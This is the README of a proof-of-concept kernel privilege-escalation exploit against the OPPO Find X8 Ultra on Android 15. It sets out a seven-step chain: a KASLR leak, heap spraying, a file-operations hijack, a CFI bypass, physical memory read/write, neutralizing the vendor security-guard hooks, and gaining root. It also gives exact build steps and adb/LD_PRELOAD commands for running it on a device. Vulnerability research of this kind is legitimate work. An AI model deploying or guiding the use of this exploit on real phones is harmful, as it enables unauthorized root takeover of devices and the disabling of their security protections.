# CVE-2026-43499 PoC (GhostLock)

Kernel privilege-escalation exploit PoC for the OPPO Find X8 Ultra (PKJ110,
Android 15, kernel 6.6). Research / education only — runs against devices you
own and are authorized to test.

## One exploit chain (7 steps)

```
1/7 KASLR leak      pselect + boot_id (nfnetlink logger pointer)
2/7 kernel page     skb spray, fake waiter/task/fops page
3/7 FOPS hijack     PI-walk stack left-write: *ashmem_misc.fops = fake_fops
4/7 CFI verify      open ashmem through fake fops; restore misc.fops;
                    repair boot_id / loggers[1] render slot
 ├ 5/7 pipe phys-RW splice/page_cache read-write of physmap/slab
 ├ 6/7 secureguard  zero oplus_secure_guard_new kprobe handlers
 └ 7/7 UMH root     fake work_struct -> system_unbound_wq; kernel forks
                    the root script (no setuid/setenforce syscall)
                    fallback: cred patch
                    then: Swordfish watcher clears mitigation props
```

Root mechanism fork: UMH (primary) -> cred-patch (fallback).

## Build

NDK r27d, clang, aarch64-linux-android35:

```
_rebuild.bat        (Windows; or see the clang invocation inside)
```

Artifact: `build/oppo-findx8ultra/bin/preload.so`

## Run (device)

```
adb push build/oppo-findx8ultra/bin/preload.so /data/local/tmp/gl-aso.so
# after reboot: wait >= 3 min uptime
cd /data/local/tmp
GHOSTLOCK_MAGICA=1 DEBUG=1 LD_PRELOAD=./gl-aso.so timeout 115 /system/bin/true
```

Without `DEBUG=1` only the per-step markers and the final verdict
(`ROOT 成功` / `ROOT 失败`) are printed; with it, full diagnostics.

Diagnostic-only env exits (no root): `GHOSTLOCK_SLIDE_ONLY`,
`GHOSTLOCK_BOOT_ID_LEAK_ONLY`, `GHOSTLOCK_FOPS_PI_ONLY`,
`GHOSTLOCK_KERNELSNITCH_ONLY`, `GHOSTLOCK_FOPS_DRYRUN`,
`GHOSTLOCK_FORCE_KASLR_BASE`.

## Layout

```
src/main.c         run_exploit: step chain + verdicts
src/slide.c        KASLR leak stages (pselect/boot_id)
src/fops.c         FOPS hijack + CFI stage + child-root install
src/pipe.c         pipe-based physical read/write
src/secureguard.c  oplus_secure_guard_new neutralization
src/umh_root.c     UMH root injection + Swordfish watcher
src/root.c         fallback cred-patch path + magica stages
src/magica.c       KernelSU load / props / soft reboot
src/preload.c      LD_PRELOAD constructor
src/targets/       device-specific offsets (PKJ110)
src/kernelsnitch/  third-party leak primitives (utils)
build/             prebuilt artifacts
```
